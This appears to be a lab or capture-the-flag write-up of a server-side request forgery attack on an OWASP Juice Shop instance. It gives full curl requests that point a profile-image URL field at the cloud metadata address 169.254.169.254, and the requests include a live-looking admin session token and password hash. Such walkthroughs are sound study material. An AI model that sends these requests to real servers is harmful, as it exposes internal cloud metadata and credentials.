I first browse the profile page as a logged in user https://juice.8-thousander.me/profile

I notice the page allows user the user to provide an url as their profile image. 

I tried providing url to google's company logo and see what happen https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png

this is the api request extract from browser

```
curl 'https://juice.8-thousander.me/profile/image/url' \
  -H 'authority: juice.8-thousander.me' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-US,en;q=0.9,zh-TW;q=0.8,zh;q=0.7,zh-CN;q=0.6' \
  -H 'cache-control: max-age=0' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'cookie: language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss; continueCode=DjlxLm8B9r4Zy2zpAZLtyUbTZFjfBSpi9RfkKSxkiqwGOKoY3VkX1EWPa7n5; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy8xLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMy0wMy0yMyAwNToyNjozOS44NjAgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMy0wMy0yNCAwNzowMjoyMS4yMjAgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjc5NzIyNTMwLCJleHAiOjE2Nzk3NDA1MzB9.L31SdayMDF6_eXVwF6ZHX5a4Hdwh1djeK1P8uiZwuI_eTon5qLXz10WcOkY0_12sdavd1skFuvk8RzszilVf0AvlVaC2StCuP1Uw1Lbq-ope8nq-x5PqT_dLa1B_VLnyoeo38Gx5yz_rWn2o-3dgM28e0f1qmLijIPrvcKEjOMU' \
  -H 'dnt: 1' \
  -H 'origin: https://juice.8-thousander.me' \
  -H 'referer: https://juice.8-thousander.me/profile' \
  -H 'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36' \
  --data-raw 'imageUrl=https%3A%2F%2Fwww.google.com%2Fimages%2Fbranding%2Fgooglelogo%2F2x%2Fgooglelogo_light_color_92x30dp.png' \
  --compressed
```

after the page refreshed, and the google company logo has become my profile picture. 

i tried a variety of urls, i notice the image url api not only download image files, but any files including texttual files.  i notice this is an opportunity for performing an ssrf attack. 

i am going to attack the server's metadata endpoint. the attack is based on an cloud ssrf list gathered from github https://gist.githubusercontent.com/jhaddix/78cece26c91c6263653f31ba453e273b/raw/a4869d58a5ce337d1465c2d1b29777b9eecd371f/cloud_metadata.txt

ultimately, i found one particular metadata endpoint that worked. the metadata is available only to the azure cloud platform. 

```
curl 'https://juice.8-thousander.me/profile/image/url' \
  -H 'authority: juice.8-thousander.me' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-US,en;q=0.9,zh-TW;q=0.8,zh;q=0.7,zh-CN;q=0.6' \
  -H 'cache-control: max-age=0' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'cookie: language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss; continueCode=DjlxLm8B9r4Zy2zpAZLtyUbTZFjfBSpi9RfkKSxkiqwGOKoY3VkX1EWPa7n5; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy8xLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMy0wMy0yMyAwNToyNjozOS44NjAgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMy0wMy0yNCAwNzowMjoyMS4yMjAgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjc5NzIyNTMwLCJleHAiOjE2Nzk3NDA1MzB9.L31SdayMDF6_eXVwF6ZHX5a4Hdwh1djeK1P8uiZwuI_eTon5qLXz10WcOkY0_12sdavd1skFuvk8RzszilVf0AvlVaC2StCuP1Uw1Lbq-ope8nq-x5PqT_dLa1B_VLnyoeo38Gx5yz_rWn2o-3dgM28e0f1qmLijIPrvcKEjOMU' \
  -H 'dnt: 1' \
  -H 'origin: https://juice.8-thousander.me' \
  -H 'referer: https://juice.8-thousander.me/profile' \
  -H 'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "macOS"' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36' \
  --data-raw 'imageUrl=http%3A%2F%2F169.254.169.254%2Fmetadata%2Fv1%2Fmaintenance' \
  --compressed
```

subsequent test confirmed my profile pic has been replaced by the content of that internal metadata endpoint https://juice.8-thousander.me/assets/public/images/uploads/1.jpg

this means i have bypassed network access control and access a resource only available to internal network. i can use this vulnerability to perform further reconnaissance work. 